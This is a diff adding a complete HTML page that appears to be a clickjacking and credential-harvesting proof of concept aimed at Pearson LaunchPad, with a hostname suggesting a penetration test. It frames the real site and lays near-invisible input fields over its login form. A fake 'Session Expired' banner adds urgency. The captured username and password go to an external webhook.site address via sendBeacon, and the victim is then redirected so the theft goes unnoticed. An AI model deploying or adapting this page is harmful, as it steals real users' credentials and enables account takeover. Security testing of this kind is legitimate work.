@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Session Management</title>
+  <style>
+    body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background: #f5f6f8; font-family: "Segoe UI", Tahoma, sans-serif; }
+    
+    /* The legitimate Pearson SPA loads here */
+    iframe {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      border: none;
+      z-index: 1;
+    }
+
+    /* Invisible overlay to capture input */
+    .capture-layer {
+      position: fixed;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 442px; /* Matches Pearson's UI width */
+      height: 48px;
+      opacity: 0.01; /* Set to 0.5 and red background for tuning */
+      z-index: 100;
+      border: 2px solid red; /* Visual aid for tuning */
+      background: transparent;
+      outline: none;
+    }
+
+    /* Pixel-calibrated positions based on the SPA centered layout */
+    #fake-username { top: 434px; }
+    #fake-password { top: 524px; }
+    #fake-submit   { top: 625px; height: 50px; cursor: pointer; }
+
+    /* The "Trap" Banner - increases urgency and explains the overlay */
+    #banner {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      background: #fff3cd;
+      color: #856404;
+      padding: 15px;
+      text-align: center;
+      z-index: 1000;
+      border-bottom: 2px solid #ffeeba;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+    }
+  </style>
+</head>
+<body>
+
+  <div id="banner">
+    <strong>Session Expired:</strong> Your Pearson LaunchPad session has timed out. Please re-authenticate to prevent data loss.
+  </div>
+
+  <iframe src="https://pentest.launchpad.pearsonprd.tech/#/clients/2e154358-4d86-11f1-bbd8-bf9d5d366960"></iframe>
+
+  <!-- Transparent Capture Fields -->
+  <input id="fake-username" class="capture-layer" type="text" placeholder="Username" autocomplete="off">
+  <input id="fake-password" class="capture-layer" type="password" placeholder="Password" autocomplete="off">
+  <div id="fake-submit" class="capture-layer" onclick="harvest()"></div>
+
+  <script>
+    const WEBHOOK_URL = 'https://webhook.site/50883ea1-1ea2-4000-abb9-a395ff1f1cd7';
+
+    function harvest() {
+      const u = document.getElementById('fake-username').value;
+      const p = document.getElementById('fake-password').value;
+
+      if (u && p) {
+        // Exfiltrate via Beacon API (more reliable for redirects)
+        navigator.sendBeacon(WEBHOOK_URL, JSON.stringify({
+          event: "clickjacking_capture",
+          client: "Pearson LaunchPad",
+          captured_user: u,
+          captured_pass: p,
+          ts: new Date().toISOString()
+        }));
+
+        // Redirect to real site so the victim thinks they just logged in
+        window.location.href = "https://pentest.launchpad.pearsonprd.tech/#/clients/2e154358-4d86-11f1-bbd8-bf9d5d366960";
+      }
+    }
+
+    // Capture Enter key
+    document.addEventListener('keydown', (e) => {
+      if (e.key === 'Enter') harvest();
+    });
+  </script>
+</body>
+</html>
